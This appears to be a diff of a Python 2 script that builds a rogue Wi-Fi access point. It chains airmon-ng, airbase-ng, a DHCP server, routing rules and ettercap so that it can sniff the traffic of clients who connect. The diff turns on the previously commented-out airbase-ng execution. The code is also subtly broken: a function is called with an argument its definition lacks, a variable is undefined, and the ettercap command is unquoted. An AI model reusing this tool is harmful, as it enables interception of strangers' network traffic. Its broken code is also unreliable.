@@ -104,10 +104,14 @@ def GettingAttributes():
                 OptionsArray[IntegerInternet] = ""
                 OptionsArray[IntegerAP] = ""
                 GettingAttributes()
-	os.system("airmon-ng start "+APHostingInterface )
+	
+	# Monitor Mode
+	AirmonCommand = "airmon-ng start "+APHostingInterface 
+	os.system(AirmonCommand)
+	
+	# Starting other Defs
+	SetUpDhcpServer(APHostingInterface)
 	SetIpRules(Gateway, InternetInterface)
-	print yellow + "[*]"  + white + "Starting Airbase-Server"
-	StartAirbaseServer(APHostingInterface)	
 	print yellow + "[*]"  + white + "Starting Ettercap"
 	StartEttercap()
 
@@ -132,7 +136,7 @@ def LoadTable(InterfaceArray, OptionsArray):
 
 
 def SetUpDhcpServer():
-	
+	print yellow + "[*]"  + white + "Set up Dhcp Server"
 	if(os.path.isfile("/etc/dhcpd.conf")):
 		print red +'[-] ' + white + "Deleting old dhcpd.conf"
 		os.system("rm /etc/dhcpd.conf")	
@@ -153,10 +157,11 @@ def SetUpDhcpServer():
 	os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
 	os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
 	os.system("echo '}' >> /etc/dhcpd.conf ")	
+	StartAirbaseServer(UserAP)
 
 
-def StartAirbaseServer(APHostingInterface):
-	
+def StartAirbaseServer(UserAP):
+	print yellow + "[*]"  + white + "Starting Airbase-Server"
 	# Check for LogFile
 	LogFile = Path + "/AirBase.log"
 	if(os.path.isfile(LogFile)):
@@ -165,17 +170,18 @@ def StartAirbaseServer(APHostingInterface):
 	
 
 	# Set Air-Base String
-	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + APHostingInterface  +  " mon0 > " + Path + "/AirBase.log 2>&1"
+	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + UserAP +  " mon0 > " + Path + "/AirBase.log 2>&1"
 	 
 	#Execute
-	print CommandAirBase
-	#os.system(CommandAirBase) 
+	os.system(CommandAirBase) 
 
 def StartEttercap():
-	print ""
+	print yellow + "[*]"  + white + "Starting to Listen on AP"
+	os.system(ettercap -p -u -T -q -i at0)
 
  
 def SetIpRules(Gateway, InterfaceInternet):
+	print yellow + "[*]"  + white + "Routing Rules"
 	os.system("ifconfig at0 192.168.1.1 netmask 255.255.255.0")
 	os.system("ifconfig at0 mtu 1400")
 	os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
@@ -197,5 +203,5 @@ def HelpFunction():
 
 # Main Program
 
-SetUpDhcpServer()
+GettingAttributes()
 
